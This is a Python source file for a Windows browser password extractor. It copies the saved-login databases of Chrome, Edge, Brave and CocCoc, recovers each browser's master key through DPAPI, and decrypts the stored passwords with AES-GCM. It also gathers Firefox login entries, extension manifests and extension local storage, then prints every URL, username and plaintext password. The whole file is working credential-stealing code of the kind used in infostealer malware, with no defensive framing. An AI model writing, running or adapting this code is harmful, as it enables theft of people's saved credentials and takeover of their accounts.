import os
import json
import base64
import sqlite3
import shutil

from datetime import datetime, timedelta
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES


class BrowserPasswordExtractor:
    def __init__(self):
        """Initialize the browser password extractor"""
        self.user_data_path = os.path.join(os.environ["USERPROFILE"], "AppData")

    def get_chrome_based_passwords(self, browser_path, browser_name):
        """Extract passwords from Chromium-based browsers
        
        Args:
            browser_path: Path to browser data (optional)
            browser_name: Name of the browser (Chrome/Edge/Brave/CocCoc)
            
        Returns:
            List of dictionaries containing password data
        """
        passwords = []
        paths = {
            "Chrome": os.path.join(self.user_data_path, "Local", "Google", "Chrome", "User Data"),
            "Edge": os.path.join(self.user_data_path, "Local", "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(self.user_data_path, "Local", "BraveSoftware", "Brave-Browser", "User Data"),
            "CocCoc": os.path.join(self.user_data_path, "Local", "CocCoc", "Browser", "User Data"),
        }

        if browser_name not in paths:
            print(f"Browser {browser_name} is not supported")
            return passwords

        browser_path = paths[browser_name]
        if not os.path.exists(browser_path):
            print(f"Browser {browser_name} is not installed")
            return passwords

        try:
            key = self._get_encryption_key(browser_path)
        except FileNotFoundError:
            print(f"Browser {browser_name} data not found or browser is running")
            return passwords
        except Exception as e:
            print(f"Error getting encryption key for {browser_name}: {str(e)}")
            return passwords

        db_path = os.path.join(browser_path, "Default", "Login Data")
        if not os.path.exists(db_path):
            print(f"No saved passwords found in {browser_name}")
            return passwords

        filename = f"{browser_name}Data.db"
        
        try:
            shutil.copyfile(db_path, filename)
            
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_created FROM logins")
            
            for row in cursor.fetchall():
                origin_url = row[0]
                username = row[1]
                password = self._decrypt_password(row[2], key)
                date_created = self._get_chrome_datetime(row[3])
                
                if username or password:
                    passwords.append({
                        "browser": browser_name,
                        "url": origin_url,
                        "username": username,
                        "password": password,
                        "date_created": str(date_created)
                    })
            
            cursor.close()
            db.close()
        except sqlite3.OperationalError as e:
            print(f"Database error for {browser_name}: {str(e)}")
        except Exception as e:
            print(f"Error processing {browser_name}: {str(e)}")
        finally:
            try:
                os.remove(filename)
            except:
                pass
        
        return passwords

    def get_firefox_passwords(self):
        """Extract passwords from Firefox browser
        
        Returns:
            List of dictionaries containing password data
        """
        passwords = []
        firefox_path = os.path.join(self.user_data_path, "Roaming", "Mozilla", "Firefox", "Profiles")
        
        # Check if Firefox is installed
        if not os.path.exists(firefox_path):
            print("Firefox is not installed or no profile found")
            return passwords
        
        try:
            profiles = os.listdir(firefox_path)
            
            if not profiles:
                print("No Firefox profiles found")
                return passwords
            
            for profile in profiles:
                if profile.endswith('.default') or profile.endswith('.default-release'):
                    db_path = os.path.join(firefox_path, profile, "logins.json")
                    if not os.path.exists(db_path):
                        continue

                    with open(db_path, 'r', encoding='utf-8') as file:
                        logins = json.load(file)
                        for login in logins.get('logins', []):
                            passwords.append({
                                "browser": "Firefox",
                                "url": login.get('hostname', ''),
                                "username": login.get('encryptedUsername', ''),
                                "password": login.get('encryptedPassword', ''),
                                "date_created": login.get('timeCreated', '')
                            })
                        
            if not passwords:
                print("No saved passwords found in Firefox")
            
        except FileNotFoundError:
            print("Firefox profile data not found")
        except json.JSONDecodeError:
            print("Error reading Firefox password file")
        except Exception as e:
            print(f"Error processing Firefox: {str(e)}")
        
        return passwords

    def _get_chrome_datetime(self, chrome_date):
        """Convert Chrome datetime format to Python datetime
        
        Args:
            chrome_date: Chrome format datetime
            
        Returns:
            Python datetime object
        """
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_date)

    def _get_encryption_key(self, browser_path):
        """Get encryption key from browser
        
        Args:
            browser_path: Path to browser data directory
            
        Returns:
            Decrypted encryption key
        """
        local_state_path = os.path.join(browser_path, "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]  # Remove 'DPAPI' prefix
        return CryptUnprotectData(key, None, None, None, 0)[1]

    def _decrypt_password(self, password, key):
        """Decrypt encrypted password
        
        Args:
            password: Encrypted password
            key: Encryption key
            
        Returns:
            Decrypted password string
        """
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    def get_chrome_based_extensions(self, browser_path, browser_name):
        """Extract extension data from Chromium-based browsers
        
        Args:
            browser_path: Path to browser data
            browser_name: Name of the browser
            
        Returns:
            List of dictionaries containing extension data
        """
        extensions = []
        extension_path = os.path.join(browser_path, "Default", "Extensions")
        
        if not os.path.exists(extension_path):
            print(f"No extensions found in {browser_name}")
            return extensions
            
        try:
            # Get all extension folders
            ext_folders = os.listdir(extension_path)
            
            for ext_id in ext_folders:
                ext_base_path = os.path.join(extension_path, ext_id)
                if not os.path.isdir(ext_base_path):
                    continue
                    
                # Get latest version folder
                versions = os.listdir(ext_base_path)
                if not versions:
                    continue
                    
                latest_version = sorted(versions)[-1]
                manifest_path = os.path.join(ext_base_path, latest_version, "manifest.json")
                
                if os.path.exists(manifest_path):
                    try:
                        with open(manifest_path, 'r', encoding='utf-8') as f:
                            manifest = json.load(f)
                            
                        # Get extension data from manifest
                        ext_data = {
                            "browser": browser_name,
                            "id": ext_id,
                            "name": manifest.get("name", "Unknown"),
                            "version": manifest.get("version", "Unknown"),
                            "description": manifest.get("description", ""),
                            "permissions": manifest.get("permissions", []),
                            "content_scripts": manifest.get("content_scripts", []),
                            "background": manifest.get("background", {}),
                            "web_accessible_resources": manifest.get("web_accessible_resources", [])
                        }
                        
                        # Get extension local storage data
                        local_storage_path = os.path.join(browser_path, "Default", "Local Storage", "leveldb")
                        if os.path.exists(local_storage_path):
                            ext_data["local_storage"] = self._get_extension_storage(local_storage_path, ext_id)
                            
                        extensions.append(ext_data)
                        
                    except Exception as e:
                        print(f"Error processing extension {ext_id}: {str(e)}")
                        
        except Exception as e:
            print(f"Error getting extensions from {browser_name}: {str(e)}")
            
        return extensions

    def _get_extension_storage(self, storage_path, ext_id):
        """Get extension's local storage data
        
        Args:
            storage_path: Path to browser's local storage
            ext_id: Extension ID
            
        Returns:
            Dictionary containing extension's local storage data
        """
        storage_data = {}
        
        try:
            for filename in os.listdir(storage_path):
                if filename.endswith(".log") or filename.endswith(".ldb"):
                    file_path = os.path.join(storage_path, filename)
                    try:
                        with open(file_path, 'rb') as f:
                            content = f.read().decode('utf-8', errors='ignore')
                            # Look for extension data in storage
                            if ext_id in content:
                                # Extract key-value pairs
                                for line in content.split('\n'):
                                    if ext_id in line and '_' in line:
                                        try:
                                            key = line.split('_')[1].split('\x00')[0]
                                            value = line.split('\x00')[1]
                                            storage_data[key] = value
                                        except:
                                            continue
                    except:
                        continue
        except Exception as e:
            print(f"Error reading local storage: {str(e)}")
            
        return storage_data

def main():
    """Main function to extract and display passwords and extension data from browsers"""
    extractor = BrowserPasswordExtractor()
    all_passwords = []
    all_extensions = []

    # Get passwords and extensions from Chromium-based browsers
    browsers = ["Chrome", "Edge", "Brave", "CocCoc"]
    for browser in browsers:
        try:
            # Get browser path
            browser_path = os.path.join(extractor.user_data_path, "Local", {
                "Chrome": "Google\\Chrome",
                "Edge": "Microsoft\\Edge",
                "Brave": "BraveSoftware\\Brave-Browser",
                "CocCoc": "CocCoc\\Browser"
            }[browser], "User Data")

            if not os.path.exists(browser_path):
                continue

            # Get passwords
            passwords = extractor.get_chrome_based_passwords(None, browser)
            all_passwords.extend(passwords)
            if passwords:
                print(f"\nFound {len(passwords)} passwords from {browser}")

            # Get extensions
            extensions = extractor.get_chrome_based_extensions(browser_path, browser)
            all_extensions.extend(extensions)
            if extensions:
                print(f"Found {len(extensions)} extensions from {browser}")

        except Exception as e:
            print(f"\nError processing {browser}: {str(e)}")

    # Get Firefox data
    try:
        firefox_passwords = extractor.get_firefox_passwords()
        all_passwords.extend(firefox_passwords)
        if firefox_passwords:
            print(f"\nFound {len(firefox_passwords)} passwords from Firefox")
    except Exception as e:
        print(f"\nError processing Firefox: {str(e)}")

    # Print password results
    if all_passwords:
        print("\n" + "="*50 + f"\nAll passwords found: {len(all_passwords)}\n" + "="*50)
        for data in all_passwords:
            print(f"\nBrowser: {data['browser']}")
            print(f"URL: {data['url']}")
            print(f"Username: {data['username']}")
            print(f"Password: {data['password']}")
            print(f"Date Created: {data['date_created']}")
            print("-" * 50)

    # Print extension results
    if all_extensions:
        print("\n" + "="*50 + f"\nAll extensions found: {len(all_extensions)}\n" + "="*50)
        for ext in all_extensions:
            print(f"\nBrowser: {ext['browser']}")
            print(f"Name: {ext['name']}")
            print(f"ID: {ext['id']}")
            print(f"Version: {ext['version']}")
            print(f"Description: {ext['description'][:100]}...")
            print(f"Permissions: {', '.join(ext['permissions'][:5])}...")
            if ext['local_storage']:
                print("Local Storage Data Found")
            print("-" * 50)

    if not all_passwords and not all_extensions:
        print("\nNo data found from any browser")

if __name__ == "__main__":
    main()
